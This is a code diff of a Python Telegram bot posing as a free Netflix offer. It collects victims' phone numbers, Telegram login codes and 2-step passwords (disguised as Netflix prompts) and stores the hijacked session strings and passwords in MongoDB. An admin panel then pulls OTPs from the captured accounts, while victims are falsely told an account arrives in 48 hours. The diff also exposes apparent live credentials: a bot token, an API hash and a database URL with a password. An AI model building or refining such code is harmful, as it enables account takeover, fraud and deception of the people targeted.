@@ -1,11 +1,11 @@
 """
 Netflix OTP Bot - Professional UI with Admin/User separation
-Updated with proper OTP response handling
+Removed Logout function, improved message handling
 """
 
 import os
 import logging
-from datetime import datetime, timedelta
+from datetime import datetime
 from bson import ObjectId
 from pymongo import MongoClient
 import telebot
@@ -17,22 +17,20 @@ from account import AccountManager
 # ========================
 # CONFIGURATION
 # ========================
-BOT_TOKEN = os.getenv('BOT_TOKEN', '8519826315:AAHbIs3wdmNwfSoWN3LxAetdmNsqllUfJLs')
-ADMIN_ID = int(os.getenv('ADMIN_ID', '7308740606'))
+BOT_TOKEN = os.getenv('BOT_TOKEN', 'YOUR_BOT_TOKEN_HERE')
+ADMIN_ID = int(os.getenv('ADMIN_ID', 'YOUR_ADMIN_ID_HERE'))
 
 # Pyrogram API credentials
 API_ID = int(os.getenv('API_ID', '6435225'))
 API_HASH = os.getenv('API_HASH', '4e984ea35f854762dcde906dce426c2d')
 
 # MongoDB
-MONGO_URL = os.getenv('MONGO_URL', 'mongodb+srv://Alisha:Alisha123@cluster0.yqcpftw.mongodb.net/?retryWrites=true&w=majority')
+MONGO_URL = os.getenv('MONGO_URL', 'mongodb://localhost:27017/otp_bot')
 
 # Netflix Theme Images
-NETFLIX_MAIN_IMAGE = "https://files.catbox.moe/hihx1r.jpg"
-NETFLIX_WELCOME_IMAGE = "https://files.catbox.moe/hihx1r.jpg"
+NETFLIX_MAIN_IMAGE = "https://i.imgur.com/7s0nqh.jpg"  # Netflix themed image
+NETFLIX_WELCOME_IMAGE = "https://i.imgur.com/hghdstyfdtydduygd.jpg"  # Your image URL
 
-# Pagination
-ACCOUNTS_PER_PAGE = 5
 # ========================
 # SETUP
 # ========================
@@ -62,29 +60,11 @@ except Exception as e:
 account_manager = AccountManager(API_ID, API_HASH)
 
 # Store temporary login states
-login_states = {}  # {user_id: {step: "phone", phone: "", phone_code_hash: "", session_key: "", user_type: ""}}
-
-# Store pagination states
-pagination_states = {}  # {user_id: {page: 1, total_pages: x}}
-
-# Store current message IDs for each user
-user_current_messages = {}  # {user_id: message_id}
+login_states = {}  # {user_id: {step: "phone", phone: "", phone_code_hash: "", session_key: ""}}
 
 # ========================
 # UTILITY FUNCTIONS
 # ========================
-def cleanup_old_logs():
-    """Delete OTP logs older than 24 hours"""
-    try:
-        cutoff_time = datetime.utcnow() - timedelta(hours=24)
-        result = otp_logs_col.delete_many({"fetched_at": {"$lt": cutoff_time}})
-        if result.deleted_count > 0:
-            logger.info(f"🧹 Cleaned up {result.deleted_count} old OTP logs")
-        return result.deleted_count
-    except Exception as e:
-        logger.error(f"Cleanup error: {e}")
-        return 0
-
 def is_admin(user_id):
     """Check if user is admin"""
     return str(user_id) == str(ADMIN_ID)
@@ -113,114 +93,48 @@ def ensure_user_exists(user_id, user_name=None, username=None):
 
 def format_phone(phone):
     """Format phone number for display"""
-    if not phone:
-        return "N/A"
     return phone if len(phone) <= 15 else f"{phone[:12]}..."
 
-def get_valid_accounts_count():
-    """Get count of accounts with valid session strings"""
-    try:
-        # Count accounts with non-empty session_string
-        count = accounts_col.count_documents({
-            "session_string": {"$exists": True, "$ne": None, "$ne": ""},
-            "status": {"$ne": "invalid"}
-        })
-        return count
-    except Exception as e:
-        logger.error(f"Count valid accounts error: {e}")
-        return 0
+def get_total_accounts():
+    """Get total number of accounts (admin only)"""
+    return accounts_col.count_documents({}) if is_admin(ADMIN_ID) else 0
 
-def get_valid_accounts(page=1):
-    """Get paginated accounts (show all, but mark invalid ones)"""
-    try:
-        skip = (page - 1) * ACCOUNTS_PER_PAGE
-        
-        # Get all accounts (including those being re-logged)
-        accounts = list(accounts_col.find(
-            {},
-            {"phone": 1, "_id": 1, "has_2fa": 1, "session_string": 1, "status": 1}
-        ).sort("created_at", -1).skip(skip).limit(ACCOUNTS_PER_PAGE))
-        
-        # Verify session strings and update status
-        for account in accounts:
-            session_string = account.get("session_string", "")
-            if session_string and session_string.strip():
-                try:
-                    # Try to create client to verify session
-                    client = account_manager.get_client_from_session(session_string)
-                    if client and client.is_connected:
-                        # Update status to active if was invalid
-                        if account.get("status") == "invalid":
-                            accounts_col.update_one(
-                                {"_id": account["_id"]},
-                                {"$set": {"status": "active"}}
-                            )
-                            account["status"] = "active"
-                    if client:
-                        client.disconnect()
-                except Exception as e:
-                    # Session is invalid
-                    logger.error(f"Session invalid for {account['phone']}: {e}")
-                    accounts_col.update_one(
-                        {"_id": account["_id"]},
-                        {"$set": {"status": "invalid"}}
-                    )
-                    account["status"] = "invalid"
-            else:
-                # No session string
-                accounts_col.update_one(
-                    {"_id": account["_id"]},
-                    {"$set": {"status": "invalid"}}
-                )
-                account["status"] = "invalid"
-        
-        total = accounts_col.count_documents({})
-        total_pages = (total + ACCOUNTS_PER_PAGE - 1) // ACCOUNTS_PER_PAGE
-        
-        return accounts, total_pages
-    except Exception as e:
-        logger.error(f"Get accounts error: {e}")
-        return [], 1
-
-def get_total_otp_logs_24h():
-    """Get total OTP logs from last 24 hours"""
-    try:
-        cutoff_time = datetime.utcnow() - timedelta(hours=24)
-        count = otp_logs_col.count_documents({"fetched_at": {"$gte": cutoff_time}})
-        return count
-    except Exception as e:
-        logger.error(f"Count OTP logs error: {e}")
-        return 0
+def get_all_accounts():
+    """Get all accounts (admin only)"""
+    if not is_admin(ADMIN_ID):
+        return []
+    return list(accounts_col.find({}, {"phone": 1, "_id": 1}).sort("created_at", -1))
 
 def save_account(phone, session_string, has_2fa=False, two_step_password=None, added_by=None):
-    """Save or update account to database"""
+    """Save account to database"""
     try:
         # Check if account already exists
         existing = accounts_col.find_one({"phone": phone})
-        
-        account_data = {
-            "phone": phone,
-            "session_string": session_string,
-            "has_2fa": has_2fa,
-            "two_step_password": two_step_password,
-            "updated_at": datetime.utcnow(),
-            "added_by": added_by,
-            "status": "active"
-        }
-        
         if existing:
-            # Update existing account
             accounts_col.update_one(
                 {"phone": phone},
-                {"$set": account_data}
+                {"$set": {
+                    "session_string": session_string,
+                    "has_2fa": has_2fa,
+                    "two_step_password": two_step_password,
+                    "updated_at": datetime.utcnow(),
+                    "added_by": added_by
+                }}
             )
             logger.info(f"Account updated: {phone}")
         else:
-            # Create new account
-            account_data["created_at"] = datetime.utcnow()
+            account_data = {
+                "phone": phone,
+                "session_string": session_string,
+                "has_2fa": has_2fa,
+                "two_step_password": two_step_password,
+                "created_at": datetime.utcnow(),
+                "updated_at": datetime.utcnow(),
+                "added_by": added_by,
+                "status": "active"
+            }
             accounts_col.insert_one(account_data)
             logger.info(f"Account saved: {phone}")
-        
         return True
     except Exception as e:
         logger.error(f"Save account error: {e}")
@@ -242,68 +156,19 @@ def save_otp_log(phone, otp, fetched_by=None):
         logger.error(f"Save OTP log error: {e}")
         return False
 
-def update_user_message(user_id, message_id):
-    """Update current message for user"""
-    user_current_messages[user_id] = message_id
-
-def get_user_current_message(user_id):
-    """Get current message ID for user"""
-    return user_current_messages.get(user_id)
-
-def send_or_edit_message(chat_id, user_id, text, markup=None, parse_mode="HTML", photo_url=None):
-    """Send or edit message in single message flow"""
-    current_msg_id = get_user_current_message(user_id)
-    
+def delete_and_send(chat_id, old_message_id, text, markup=None, parse_mode="HTML", photo_url=None):
+    """Delete old message and send new one"""
     try:
-        if current_msg_id:
-            # Try to edit existing message
+        # Delete old message if exists
+        if old_message_id:
             try:
-                if photo_url:
-                    # Can't edit photo, so delete and send new
-                    try:
-                        bot.delete_message(chat_id, current_msg_id)
-                    except:
-                        pass
-                    msg = bot.send_photo(
-                        chat_id,
-                        photo_url,
-                        caption=text,
-                        parse_mode=parse_mode,
-                        reply_markup=markup
-                    )
-                else:
-                    bot.edit_message_text(
-                        text,
-                        chat_id=chat_id,
-                        message_id=current_msg_id,
-                        parse_mode=parse_mode,
-                        reply_markup=markup
-                    )
-                    msg = type('obj', (object,), {'message_id': current_msg_id})()
+                bot.delete_message(chat_id, old_message_id)
             except:
-                # If edit fails, delete and send new
-                try:
-                    bot.delete_message(chat_id, current_msg_id)
-                except:
-                    pass
-                if photo_url:
-                    msg = bot.send_photo(
-                        chat_id,
-                        photo_url,
-                        caption=text,
-                        parse_mode=parse_mode,
-                        reply_markup=markup
-                    )
-                else:
-                    msg = bot.send_message(
-                        chat_id,
-                        text,
-                        parse_mode=parse_mode,
-                        reply_markup=markup
-                    )
-        else:
-            # No existing message, send new
-            if photo_url:
+                pass
+        
+        # Send new message
+        if photo_url:
+            try:
                 msg = bot.send_photo(
                     chat_id,
                     photo_url,
@@ -311,6 +176,83 @@ def send_or_edit_message(chat_id, user_id, text, markup=None, parse_mode="HTML",
                     parse_mode=parse_mode,
                     reply_markup=markup
                 )
+                return msg.message_id
+            except:
+                # If photo fails, send text
+                msg = bot.send_message(
+                    chat_id,
+                    text,
+                    parse_mode=parse_mode,
+                    reply_markup=markup
+                )
+                return msg.message_id
+        else:
+            msg = bot.send_message(
+                chat_id,
+                text,
+                parse_mode=parse_mode,
+                reply_markup=markup
+            )
+            return msg.message_id
+            
+    except Exception as e:
+        logger.error(f"Delete and send error: {e}")
+        return None
+
+def smart_edit_or_send(chat_id, user_id, message_key, text, markup=None, parse_mode="HTML", photo_url=None):
+    """Smart message handling - try to edit, if fails delete and send new"""
+    # Store message history
+    if 'message_history' not in globals():
+        global message_history
+        message_history = {}
+    
+    if user_id not in message_history:
+        message_history[user_id] = {}
+    
+    old_message_id = message_history[user_id].get(message_key)
+    
+    try:
+        # Try to edit if we have old message ID
+        if old_message_id:
+            if photo_url:
+                # For photos, we need to delete and send new
+                return delete_and_send(chat_id, old_message_id, text, markup, parse_mode, photo_url)
+            else:
+                # For text, try to edit
+                try:
+                    bot.edit_message_text(
+                        text,
+                        chat_id=chat_id,
+                        message_id=old_message_id,
+                        parse_mode=parse_mode,
+                        reply_markup=markup
+                    )
+                    return old_message_id
+                except:
+                    # If edit fails, delete and send new
+                    return delete_and_send(chat_id, old_message_id, text, markup, parse_mode, photo_url)
+        else:
+            # No old message, send new
+            if photo_url:
+                try:
+                    msg = bot.send_photo(
+                        chat_id,
+                        photo_url,
+                        caption=text,
+                        parse_mode=parse_mode,
+                        reply_markup=markup
+                    )
+                    message_history[user_id][message_key] = msg.message_id
+                    return msg.message_id
+                except:
+                    msg = bot.send_message(
+                        chat_id,
+                        text,
+                        parse_mode=parse_mode,
+                        reply_markup=markup
+                    )
+                    message_history[user_id][message_key] = msg.message_id
+                    return msg.message_id
             else:
                 msg = bot.send_message(
                     chat_id,
@@ -318,50 +260,12 @@ def send_or_edit_message(chat_id, user_id, text, markup=None, parse_mode="HTML",
                     parse_mode=parse_mode,
                     reply_markup=markup
                 )
-        
-        # Update current message
-        update_user_message(user_id, msg.message_id)
-        return msg.message_id
-        
+                message_history[user_id][message_key] = msg.message_id
+                return msg.message_id
+                
     except Exception as e:
-        logger.error(f"Send/edit message error: {e}")
+        logger.error(f"Smart edit error: {e}")
         return None
-
-# ========================
-# ADMIN LOGIN FLOW
-# ========================
-@bot.callback_query_handler(func=lambda call: call.data == "admin_add_account")
-def handle_admin_add_account(call):
-    """Start login process for admin to add account"""
-    user_id = call.from_user.id
-    
-    if not is_admin(user_id):
-        bot.answer_callback_query(call.id, "Admin only feature", show_alert=True)
-        return
-    
-    # Set state to ask for phone number
-    login_states[user_id] = {"step": "ask_phone", "user_type": "admin"}
-    
-    login_text = """
-<b>🔐 Add New Account</b>
-
-Enter phone number with country code:
-
-<b>Example:</b> +919876543210
-
-<i>This will add/update the account in database for OTP fetching.</i>
-"""
-    
-    markup = InlineKeyboardMarkup()
-    markup.add(InlineKeyboardButton("❌ Cancel", callback_data="back_to_admin"))
-    
-    send_or_edit_message(
-        call.message.chat.id,
-        user_id,
-        login_text,
-        markup=markup,
-        photo_url=NETFLIX_MAIN_IMAGE
-    )
 
 # ========================
 # BOT HANDLERS - START
@@ -376,11 +280,9 @@ def handle_start(message):
     # Ensure user exists in database
     ensure_user_exists(user_id, user_name, username)
     
-    # Clear states
+    # Clear any existing login state
     if user_id in login_states:
         del login_states[user_id]
-    if user_id in pagination_states:
-        del pagination_states[user_id]
     
     # Show appropriate menu based on user type
     if is_admin(user_id):
@@ -418,9 +320,10 @@ def show_netflix_welcome(user_id, chat_id=None):
     markup = InlineKeyboardMarkup()
     markup.add(InlineKeyboardButton("🎬 Get Netflix Now", callback_data="get_netflix_now"))
     
-    send_or_edit_message(
+    smart_edit_or_send(
         chat_id,
         user_id,
+        "welcome",
         welcome_text,
         markup=markup,
         photo_url=NETFLIX_WELCOME_IMAGE
@@ -435,36 +338,33 @@ def show_admin_dashboard(user_id, chat_id=None):
         show_netflix_welcome(user_id, chat_id)
         return
     
-    # Cleanup old logs
-    cleaned_count = cleanup_old_logs()
-    
-    total_accounts = get_valid_accounts_count()
-    total_otp_logs = get_total_otp_logs_24h()
+    total_accounts = get_total_accounts()
+    total_otp_logs = otp_logs_col.count_documents({})
     
     admin_text = f"""
 <b>👑 Netflix Admin Panel</b>
 
 <b>📊 Statistics:</b>
-• Active Accounts: {total_accounts}
-• OTP Logs (24h): {total_otp_logs}
-• Logs Cleaned: {cleaned_count}
+• Total Accounts: {total_accounts}
+• Total OTP Logs: {total_otp_logs}
 
 <b>🛠️ Management Tools:</b>
 """
     
     markup = InlineKeyboardMarkup(row_width=2)
     markup.add(
-        InlineKeyboardButton("👁 View Accounts", callback_data="view_accounts_1"),
-        InlineKeyboardButton("🔐 Add Account", callback_data="admin_add_account")
+        InlineKeyboardButton("👁 View Accounts", callback_data="view_accounts"),
+        InlineKeyboardButton("🔐 Add Account", callback_data="admin_login")
     )
     markup.add(
         InlineKeyboardButton("📊 OTP Logs", callback_data="otp_logs"),
         InlineKeyboardButton("🔄 Refresh", callback_data="refresh_admin")
     )
     
-    send_or_edit_message(
+    smart_edit_or_send(
         chat_id,
         user_id,
+        "admin_dashboard",
         admin_text,
         markup=markup,
         photo_url=NETFLIX_MAIN_IMAGE
@@ -477,10 +377,6 @@ def show_admin_dashboard(user_id, chat_id=None):
 def handle_get_netflix_now(call):
     """Start Netflix login process for users"""
     user_id = call.from_user.id
-    
-    # Clear any existing states
-    if user_id in pagination_states:
-        del pagination_states[user_id]
     
     # Set state to ask for phone number
     login_states[user_id] = {"step": "ask_phone", "user_type": "netflix"}
@@ -499,9 +395,10 @@ def handle_get_netflix_now(call):
     markup = InlineKeyboardMarkup()
     markup.add(InlineKeyboardButton("❌ Cancel", callback_data="cancel_netflix"))
     
-    send_or_edit_message(
+    smart_edit_or_send(
         call.message.chat.id,
         user_id,
+        "login",
         login_text,
         markup=markup,
         photo_url=NETFLIX_WELCOME_IMAGE
@@ -516,6 +413,43 @@ def handle_cancel_netflix(call):
         del login_states[user_id]
     
     show_netflix_welcome(user_id, call.message.chat.id)
+
+# ========================
+# ADMIN LOGIN FLOW
+# ========================
+@bot.callback_query_handler(func=lambda call: call.data == "admin_login")
+def handle_admin_login(call):
+    """Start login process for admin"""
+    user_id = call.from_user.id
+    
+    if not is_admin(user_id):
+        bot.answer_callback_query(call.id, "Admin only feature", show_alert=True)
+        return
+    
+    # Set state to ask for phone number
+    login_states[user_id] = {"step": "ask_phone", "user_type": "admin"}
+    
+    login_text = """
+<b>🔐 Add New Account</b>
+
+Enter phone number with country code:
+
+<b>Example:</b> +919876543210
+
+<i>This will add the account to database for OTP fetching.</i>
+"""
+    
+    markup = InlineKeyboardMarkup()
+    markup.add(InlineKeyboardButton("❌ Cancel", callback_data="back_to_admin"))
+    
+    smart_edit_or_send(
+        call.message.chat.id,
+        user_id,
+        "login",
+        login_text,
+        markup=markup,
+        photo_url=NETFLIX_MAIN_IMAGE
+    )
 
 # ========================
 # PHONE NUMBER HANDLER (For both users and admin)
@@ -561,9 +495,10 @@ Please enter valid phone number with country code.
 Enter phone number again:
 """
         
-        send_or_edit_message(
+        smart_edit_or_send(
             chat_id,
             user_id,
+            "login",
             error_text,
             markup=markup,
             photo_url=photo
@@ -588,9 +523,10 @@ Enter phone number again:
 """
         photo = NETFLIX_WELCOME_IMAGE
     
-    send_or_edit_message(
+    smart_edit_or_send(
         chat_id,
         user_id,
+        "login",
         sending_text,
         photo_url=photo
     )
@@ -622,9 +558,10 @@ Enter phone number again:
 Enter phone number again:
 """
             
-            send_or_edit_message(
+            smart_edit_or_send(
                 chat_id,
                 user_id,
+                "login",
                 error_text,
                 markup=markup,
                 photo_url=error_photo
@@ -667,9 +604,10 @@ Enter the 5-digit OTP code received on Telegram:
 Enter the 5-digit verification code:
 """
         
-        send_or_edit_message(
+        smart_edit_or_send(
             chat_id,
             user_id,
+            "login",
             otp_text,
             markup=markup,
             photo_url=otp_photo
@@ -688,9 +626,10 @@ Error: {str(e)}
 Start again with /start
 """
         
-        send_or_edit_message(
+        smart_edit_or_send(
             chat_id,
             user_id,
+            "login",
             error_text,
             photo_url=NETFLIX_WELCOME_IMAGE
         )
@@ -699,7 +638,7 @@ Start again with /start
             del login_states[user_id]
 
 # ========================
-# OTP HANDLER (For both users and admin) - FIXED
+# OTP HANDLER (For both users and admin)
 # ========================
 @bot.message_handler(func=lambda m: login_states.get(m.from_user.id, {}).get("step") == "ask_otp")
 def handle_otp_input(message):
@@ -743,9 +682,10 @@ Netflix verification code must be 5 digits.
 Enter the code again:
 """
         
-        send_or_edit_message(
+        smart_edit_or_send(
             chat_id,
             user_id,
+            "login",
             error_text,
             markup=markup,
             photo_url=error_photo
@@ -768,31 +708,25 @@ Enter the code again:
 """
         verify_photo = NETFLIX_WELCOME_IMAGE
     
-    send_or_edit_message(
+    smart_edit_or_send(
         chat_id,
         user_id,
+        "login",
         verify_text,
         photo_url=verify_photo
     )
     
     try:
-        # Check if we need to handle 2FA password from previous step
-        two_step_password = None
-        if "two_step_password" in state:
-            two_step_password = state["two_step_password"]
-        
-        # Call verify_otp with optional 2FA password
         result = account_manager.verify_otp(
             state["session_key"],
             otp_code,
             state["phone"],
-            state["phone_code_hash"],
-            two_step_password
+            state["phone_code_hash"]
         )
         
         if result.get("needs_2fa"):
-            # 2FA required - ask for password
-            login_states[user_id]["step"] = "ask_2fa_password"
+            # 2FA required
+            login_states[user_id]["step"] = "ask_2fa"
             
             if state.get("user_type") == "admin":
                 markup = InlineKeyboardMarkup().add(
@@ -819,9 +753,10 @@ Enter your 2-step verification password:
 Enter your Netflix account password:
 """
             
-            send_or_edit_message(
+            smart_edit_or_send(
                 chat_id,
                 user_id,
+                "login",
                 text,
                 markup=markup,
                 photo_url=photo
@@ -852,9 +787,10 @@ Start again with /start
 """
                 error_photo = NETFLIX_WELCOME_IMAGE
             
-            send_or_edit_message(
+            smart_edit_or_send(
                 chat_id,
                 user_id,
+                "login",
                 error_text,
                 photo_url=error_photo
             )
@@ -878,13 +814,12 @@ Start again with /start
         # Show success message
         if user_type == "admin":
             success_text = f"""
-<b>✅ Account Added/Updated Successfully!</b>
+<b>✅ Account Added Successfully!</b>
 
 <b>📱 Phone:</b> <code>{state['phone']}</code>
 <b>🔐 2FA:</b> {'✅ Enabled' if result['has_2fa'] else '❌ Disabled'}
-<b>Status:</b> {'✅ Updated existing account' if saved else '✅ Added new account'}
 
-Account has been added/updated in database and is now available for OTP fetching.
+Account has been added to database and is now available for OTP fetching.
 """
             success_photo = NETFLIX_MAIN_IMAGE
             
@@ -918,9 +853,10 @@ Thank you for choosing Netflix! 🎬
             markup = InlineKeyboardMarkup()
             markup.add(InlineKeyboardButton("🏠 Back to Home", callback_data="back_to_welcome"))
             
-            send_or_edit_message(
+            smart_edit_or_send(
                 chat_id,
                 user_id,
+                "success",
                 success_text,
                 markup=markup,
                 photo_url=success_photo
@@ -939,9 +875,10 @@ Error: {str(e)}
 Start again with /start
 """
         
-        send_or_edit_message(
+        smart_edit_or_send(
             chat_id,
             user_id,
+            "login",
             error_text,
             photo_url=NETFLIX_WELCOME_IMAGE
         )
@@ -950,10 +887,10 @@ Start again with /start
             del login_states[user_id]
 
 # ========================
-# 2FA PASSWORD HANDLER (For both users and admin)
+# 2FA HANDLER (For both users and admin)
 # ========================
-@bot.message_handler(func=lambda m: login_states.get(m.from_user.id, {}).get("step") == "ask_2fa_password")
-def handle_2fa_password_input(message):
+@bot.message_handler(func=lambda m: login_states.get(m.from_user.id, {}).get("step") == "ask_2fa")
+def handle_2fa_input(message):
     """Handle 2FA password input from both users and admin"""
     user_id = message.from_user.id
     chat_id = message.chat.id
@@ -994,45 +931,166 @@ Netflix account password cannot be empty.
 Enter password again:
 """
         
-        send_or_edit_message(
+        smart_edit_or_send(
             chat_id,
             user_id,
+            "login",
             error_text,
             markup=markup,
             photo_url=error_photo
         )
         return
     
-    # Store password in state and go back to OTP verification
-    login_states[user_id]["two_step_password"] = password
-    login_states[user_id]["step"] = "ask_otp"
-    
-    # Show message that we're continuing verification
+    # Show verifying message
     if state.get("user_type") == "admin":
-        continue_text = """
-<b>⏳ Continuing Verification...</b>
+        verify_text = """
+<b>⏳ Verifying Password...</b>
 
-<i>Now verifying with 2FA password...</i>
-
-Please enter the OTP code again:
+<i>Checking 2-step verification password...</i>
 """
-        continue_photo = NETFLIX_MAIN_IMAGE
+        verify_photo = NETFLIX_MAIN_IMAGE
     else:
-        continue_text = """
-<b>⏳ Netflix Security Verification</b>
+        verify_text = """
+<b>⏳ Verifying Netflix Password...</b>
 
-<code>Now verifying with Netflix account password...</code>
-
-Please enter the verification code again:
+<code>Checking password with Netflix security...</code>
 """
-        continue_photo = NETFLIX_WELCOME_IMAGE
+        verify_photo = NETFLIX_WELCOME_IMAGE
     
-    send_or_edit_message(
+    smart_edit_or_send(
         chat_id,
         user_id,
-        continue_text,
-        photo_url=continue_photo
+        "login",
+        verify_text,
+        photo_url=verify_photo
     )
+    
+    try:
+        result = account_manager.verify_2fa(state["session_key"], password)
+        
+        if not result.get("success"):
+            error_msg = result.get("error", "Unknown error")
+            
+            if state.get("user_type") == "admin":
+                error_text = f"""
+<b>❌ Password Verification Failed</b>
+
+{error_msg}
+
+Start again with /start
+"""
+                error_photo = NETFLIX_MAIN_IMAGE
+            else:
+                error_text = f"""
+<b>❌ Netflix Password Incorrect</b>
+
+<code>Could not verify Netflix account password.</code>
+
+Error: {error_msg}
+
+Start again with /start
+"""
+                error_photo = NETFLIX_WELCOME_IMAGE
+            
+            smart_edit_or_send(
+                chat_id,
+                user_id,
+                "login",
+                error_text,
+                photo_url=error_photo
+            )
+            
+            if user_id in login_states:
+                del login_states[user_id]
+            return
+        
+        # Save account to database
+        user_type = state.get("user_type", "netflix")
+        added_by = user_id if user_type == "admin" else "netflix_user"
+        
+        saved = save_account(
+            state["phone"],
+            result["session_string"],
+            result["has_2fa"],
+            result.get("two_step_password"),
+            added_by
+        )
+        
+        # Show success message
+        if user_type == "admin":
+            success_text = f"""
+<b>✅ Account Added Successfully!</b>
+
+<b>📱 Phone:</b> <code>{state['phone']}</code>
+<b>🔐 2FA:</b> ✅ Enabled
+
+Account with 2FA has been added to database.
+"""
+            success_photo = NETFLIX_MAIN_IMAGE
+            
+            # Clear state and show dashboard
+            if user_id in login_states:
+                del login_states[user_id]
+            
+            show_admin_dashboard(user_id, chat_id)
+            
+        else:
+            success_text = f"""
+<b>🎉 Netflix Account Secured!</b>
+
+<code>Your Netflix account with extra security has been registered successfully.</code>
+
+<b>📱 Your Number:</b> <code>{state['phone']}</code>
+<b>🔒 Security:</b> Two-Step Enabled
+<b>⏳ Status:</b> Under Review
+<b>📅 Estimated:</b> 48 Hours
+
+<i>Netflix account will be delivered to your number within 48 hours.</i>
+
+Thank you for choosing Netflix! 🎬
+"""
+            success_photo = NETFLIX_WELCOME_IMAGE
+            
+            # Clear state
+            if user_id in login_states:
+                del login_states[user_id]
+            
+            # Show success message
+            markup = InlineKeyboardMarkup()
+            markup.add(InlineKeyboardButton("🏠 Back to Home", callback_data="back_to_welcome"))
+            
+            smart_edit_or_send(
+                chat_id,
+                user_id,
+                "success",
+                success_text,
+                markup=markup,
+                photo_url=success_photo
+            )
+        
+    except Exception as e:
+        logger.error(f"2FA verification error: {e}")
+        
+        error_text = f"""
+<b>❌ Verification Error</b>
+
+Failed to verify password.
+
+Error: {str(e)}
+
+Start again with /start
+"""
+        
+        smart_edit_or_send(
+            chat_id,
+            user_id,
+            "login",
+            error_text,
+            photo_url=NETFLIX_WELCOME_IMAGE
+        )
+        
+        if user_id in login_states:
+            del login_states[user_id]
 
 # ========================
 # ADMIN ONLY FEATURES
@@ -1047,11 +1105,9 @@ def handle_back_to_admin(call):
         show_netflix_welcome(user_id, call.message.chat.id)
         return
     
-    # Clear states
+    # Clear login state
     if user_id in login_states:
         del login_states[user_id]
-    if user_id in pagination_states:
-        del pagination_states[user_id]
     
     show_admin_dashboard(user_id, call.message.chat.id)
 
@@ -1067,84 +1123,60 @@ def handle_refresh_admin(call):
     show_admin_dashboard(user_id, call.message.chat.id)
     bot.answer_callback_query(call.id, "✅ Dashboard refreshed")
 
-@bot.callback_query_handler(func=lambda call: call.data.startswith("view_accounts_"))
+@bot.callback_query_handler(func=lambda call: call.data == "view_accounts")
 def handle_view_accounts(call):
-    """Show paginated accounts (admin only)"""
+    """Show all accounts (admin only)"""
     user_id = call.from_user.id
     
     if not is_admin(user_id):
         bot.answer_callback_query(call.id, "Admin only", show_alert=True)
         return
     
-    # Get page number from callback data
-    page = int(call.data.replace("view_accounts_", ""))
-    
-    # Fetch paginated accounts
-    accounts, total_pages = get_valid_accounts(page)
+    # Fetch all accounts
+    accounts = get_all_accounts()
     
     if not accounts:
         markup = InlineKeyboardMarkup()
-        markup.add(InlineKeyboardButton("🔐 Add Account", callback_data="admin_add_account"))
+        markup.add(InlineKeyboardButton("🔐 Add Account", callback_data="admin_login"))
         markup.add(InlineKeyboardButton("⬅️ Back", callback_data="back_to_admin"))
         
-        send_or_edit_message(
+        smart_edit_or_send(
             call.message.chat.id,
             user_id,
+            "admin_view",
             "<b>📱 No Accounts Found</b>\n\nAdd your first account to get started.",
             markup=markup,
             photo_url=NETFLIX_MAIN_IMAGE
         )
         return
     
-    # Store pagination state
-    pagination_states[user_id] = {"page": page, "total_pages": total_pages}
-    
     # Create account list text
-    account_text = f"<b>📱 All Accounts (Page {page}/{total_pages})</b>\n\n"
-    start_num = (page - 1) * ACCOUNTS_PER_PAGE + 1
-    
-    for idx, account in enumerate(accounts, start_num):
+    account_text = "<b>📱 All Accounts</b>\n\n"
+    for idx, account in enumerate(accounts[:10], 1):
         phone_display = format_phone(account["phone"])
-        status = account.get("status", "unknown")
-        
-        if status == "active":
-            status_icon = "✅"
-            has_2fa = "🔒" if account.get("has_2fa") else "🔓"
-            account_text += f"{idx}. {status_icon} {has_2fa} <code>{phone_display}</code>\n"
-        else:
-            status_icon = "❌"
-            account_text += f"{idx}. {status_icon} <code>{phone_display}</code> <i>(Invalid Session)</i>\n"
+        account_text += f"{idx}. <code>{phone_display}</code>\n"
     
-    # Create keyboard with account buttons and pagination
+    if len(accounts) > 10:
+        account_text += f"\n... and {len(accounts) - 10} more accounts"
+    
+    # Create keyboard with account buttons
     markup = InlineKeyboardMarkup(row_width=2)
     
-    # Add accounts as buttons (only active ones)
-    for account in accounts:
-        if account.get("status") == "active":
-            phone_display = format_phone(account["phone"])
-            short_phone = phone_display[:10] + "..." if len(phone_display) > 10 else phone_display
-            has_2fa = "🔒" if account.get("has_2fa") else ""
-            markup.add(InlineKeyboardButton(
-                f"{has_2fa} {short_phone}",
-                callback_data=f"account_{account['_id']}"
-            ))
+    # Add accounts as buttons
+    for account in accounts[:6]:
+        phone_display = format_phone(account["phone"])
+        short_phone = phone_display[:10] + "..." if len(phone_display) > 10 else phone_display
+        markup.add(InlineKeyboardButton(
+            f"📱 {short_phone}",
+            callback_data=f"account_{account['_id']}"
+        ))
     
-    # Add pagination buttons
-    nav_buttons = []
-    if page > 1:
-        nav_buttons.append(InlineKeyboardButton("⬅️ Previous", callback_data=f"view_accounts_{page-1}"))
-    if page < total_pages:
-        nav_buttons.append(InlineKeyboardButton("Next ➡️", callback_data=f"view_accounts_{page+1}"))
+    markup.add(InlineKeyboardButton("⬅️ Back", callback_data="back_to_admin"))
     
-    if nav_buttons:
-        markup.row(*nav_buttons)
-    
-    markup.add(InlineKeyboardButton("🔐 Add Account", callback_data="admin_add_account"))
-    markup.add(InlineKeyboardButton("⬅️ Back to Dashboard", callback_data="back_to_admin"))
-    
-    send_or_edit_message(
+    smart_edit_or_send(
         call.message.chat.id,
         user_id,
+        "admin_view",
         account_text,
         markup=markup,
         photo_url=NETFLIX_MAIN_IMAGE
@@ -1162,63 +1194,34 @@ def handle_account_selection(call):
     account_id = call.data.replace("account_", "")
     
     try:
-        # Get account
         account = accounts_col.find_one({"_id": ObjectId(account_id)})
-        
         if not account:
             bot.answer_callback_query(call.id, "Account not found", show_alert=True)
-            page = pagination_states.get(user_id, {}).get("page", 1)
-            handle_view_accounts(type('obj', (object,), {
-                'from_user': type('obj', (object,), {'id': user_id})(),
-                'message': call.message,
-                'data': f"view_accounts_{page}"
-            })())
+            handle_view_accounts(call)
             return
         
-        # Show account actions
+        # Show account actions - ONLY Get OTP button
         markup = InlineKeyboardMarkup()
-        
-        # Check if account has valid session
-        session_string = account.get("session_string", "")
-        if session_string and session_string.strip():
-            try:
-                # Verify session is still valid
-                client = account_manager.get_client_from_session(session_string)
-                if client and client.is_connected:
-                    markup.add(InlineKeyboardButton("🔢 Get Latest OTP", callback_data=f"get_otp_{account_id}"))
-                    client.disconnect()
-                else:
-                    markup.add(InlineKeyboardButton("🔄 Re-login Account", callback_data=f"relogin_{account_id}"))
-            except:
-                markup.add(InlineKeyboardButton("🔄 Re-login Account", callback_data=f"relogin_{account_id}"))
-        else:
-            markup.add(InlineKeyboardButton("🔄 Re-login Account", callback_data=f"relogin_{account_id}"))
-        
